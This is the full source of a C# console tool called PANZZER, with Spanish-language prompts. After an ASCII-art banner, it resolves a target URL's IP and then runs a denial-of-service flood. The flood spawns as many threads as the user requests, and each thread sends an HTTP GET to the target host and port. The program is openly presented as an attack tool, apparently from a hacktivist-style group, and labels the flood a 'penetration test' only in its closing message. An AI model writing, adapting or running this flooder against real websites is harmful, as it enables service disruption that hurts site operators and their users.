using System;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;

class ScannIpDoSAttack
{
    static void Main(string[] args)
    {
        MostrarMenu();
    }

    static void MostrarMenu()
    {
        Console.WriteLine("******************************************");
        Console.WriteLine("*                                        *");
        Console.WriteLine("*    PANZZER by: Rootr | MortenTod       *");
        Console.WriteLine("*                                        *");
        Console.WriteLine("*                                        *");
        Console.WriteLine("*                                        *");
        Console.WriteLine("*     created in: C# / @AnonymousCRI     *");
        Console.WriteLine("*                                        *");
        Console.WriteLine("******************************************\n");

        Console.ForegroundColor = ConsoleColor.Red;
        Console.WriteLine("                           __,----------.__                ");
        Console.WriteLine("                        ,-'   ________    `-.             ");
        Console.WriteLine("                       /    ,'        `.     \\           ");
        Console.WriteLine("        ______________|    /            \\     |_________  ");
        Console.WriteLine("       / .--  .-----.   __|              |__   .-----.  \\ ");
        Console.WriteLine("      /_/   ` |     |  |                    |  |     |   \\_");
        Console.WriteLine("     //   --  |     |  |    PANZZER - v1.1     |     |     | --  \\\\ ");
        Console.WriteLine("   _//________|_____|  |                    |  |_____|______\\\\ ");
        Console.WriteLine("  /  |      _|  |       |    _.-._.-._.-.    |      |  |       \\");
        Console.WriteLine(" |   |  ___| |__|_______|  /             \\  |______|__|____     |");
        Console.WriteLine("/|   |/    |____  |   __|/               \\_|__     |    |\\    |");
        Console.WriteLine(" |   ||___/    \\ |__|                      | |___/    \\_|    |");
        Console.WriteLine(" |  /     \\____/|                          |/    \\____/     | ");
        Console.WriteLine(" | /   o    o   \\|        ________          |/  o    o   \\    | ");
        Console.WriteLine(" |/______________|     _/        \\_        |_______________\\| ");
        Console.WriteLine("  |  |   |   |   |    |              |    |   |   |   |  |   ");
        Console.WriteLine("  `-''-'`-'`-'`-'`-'`-'`-'`-'`-'`-'`-'`-'`-'`-'`-'`-'`-'`-' ");
        Console.ResetColor();

        Console.WriteLine("   ");
        //Indicaciones de la herramienta.
        Console.WriteLine("- La herramienta Panzzer cuenta con 2 opciones: '1' la primera opción, esta sería escanear la IP de una dirección URL y '2' la segunda opción, sería realizar un At@que DoS a una dirección URL obteniendo la IP de la URL y usando el puerto ya escaneado.");
        Console.WriteLine("   ");
        Console.ForegroundColor = ConsoleColor.Red;
        Console.WriteLine("[+] Escriba 1 | primera opción Escanear una IP.");
        Console.WriteLine("[+] Escriba 2 | segunda opción Ataque DoS.");
        Console.ResetColor();
        Console.WriteLine("   ");

        string iniciar = Console.ReadLine().Trim().ToLower();
        if (iniciar == "1")
        {
            EscanearIP();
        }
        else if (iniciar == "2")
        {
            RealizarAtaqueDoS();
        }
    }

    static void EscanearIP()
    {
        //Indicaciones.
        Console.WriteLine("   ");
        Console.Write("- Introduzca la URL del objetivo para escanear la IP de la dirección (ejemplo: http://ejemplo.com): ");
        string targetaUrl = Console.ReadLine();
        Uri verdugo = new Uri(targetaUrl);

        //Obtener/Extraer la IP de la URL.
        string targetaIp = Dns.GetHostAddresses(verdugo.Host)[0].ToString();
        targetaUrl = verdugo.ToString();

        //Señalar la IP de la URL.
        Console.ForegroundColor = (ConsoleColor.Green);
        Console.WriteLine($"[-->] La IP de la URL es : {targetaIp}");
        Console.ResetColor();

        PreguntarRegresoOMenú();
    }
    static void PreguntarRegresoOMenú()
    { //Regresar al menú o seguir con la herramienta.
        Console.WriteLine("   ");
        Console.WriteLine("[+] Escriba '1' Si desea regresar al menú de la herramienta'.");
        Console.WriteLine("[+] Escriba '2' Si desea ejecutar la segunda opción del menú (At@que DoS).");

        string opcion = Console.ReadLine().Trim().ToLower();
        if (opcion == "1")
        {
            MostrarMenu();
        }
        else if (opcion == "2")
        {
            RealizarAtaqueDoS();
        }
    }
    static void RealizarAtaqueDoS()
    {
        Console.WriteLine("   ");
        Console.Write("- Introduzca la URL del objetivo para realizar el At@que DoS (ejemplo: http://ejemplo.com): ");
        string targeta2Url = Console.ReadLine();
        Uri uri = new Uri(targeta2Url);

        Console.WriteLine("- Introduzca la cantidad de hilos que prefiera para ejecutar el at@que (ejemplo 100000).");
        int numerohilo = int.Parse(Console.ReadLine());

        //Obtener la IP de la URL.
        string targetIp = Dns.GetHostAddresses(uri.Host)[0].ToString();

        //Usar el puerto de la URL.
        int targetaPuerto = uri.Port;

        Console.ForegroundColor = ConsoleColor.Red;
        Console.WriteLine($"Iniciando ataque a {targeta2Url} ({targetIp}:{targetaPuerto}) con {numerohilo} hilos.");
        Console.ResetColor();

        //Crear un array para almacenar las referencias de los hilos
        Thread[] hilos = new Thread[numerohilo];

        //Iniciar todos los hilos
        for (int i = 0; i < numerohilo; i++)
        {
            int threadNumber = i + 1; //Número de hilo para mostrar en la consola.
            hilos[i] = new Thread(() => SendRequests(targetIp, targetaPuerto, threadNumber, targeta2Url));
            hilos[i].Start();
        }

        //Espera a que todos los hilos terminen.
        for (int i = 0; i < numerohilo; i++)
        {
            hilos[i].Join(); //Espera a que cada hilo termine
        }

        //Mensaje cuando todos los hilos han terminado
        Console.ForegroundColor = ConsoleColor.Red;
        Console.WriteLine($"Prueba de penetración (DoS) finalizado con los hilos: {numerohilo}");
        Console.ResetColor();

        Console.WriteLine("Saliendo de PANZZER...");
        Console.WriteLine("Gracias por usar PANZZER " +
          "| X: @anonymousCRI - X: @elZtanomas |");
    }

    static void SendRequests(string ip, int port, int threadNumber, string url)
    {
        try
        {
            using (TcpClient client = new TcpClient(ip, port))
            {
                NetworkStream stream = client.GetStream();
                byte[] request = Encoding.ASCII.GetBytes("GET / HTTP/1.1\r\nHost: " + ip + "\r\nConnection: keep-alive\r\n\r\n");

                //Enviar solo una solicitud por cada hilo
                stream.Write(request, 0, request.Length);
                Console.WriteLine($"[-->] Solicitud enviada por el hilo {threadNumber} a {url} ({ip}:{port})");
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine($"Error en el hilo {threadNumber}: " + ex.Message);
        }
    }
}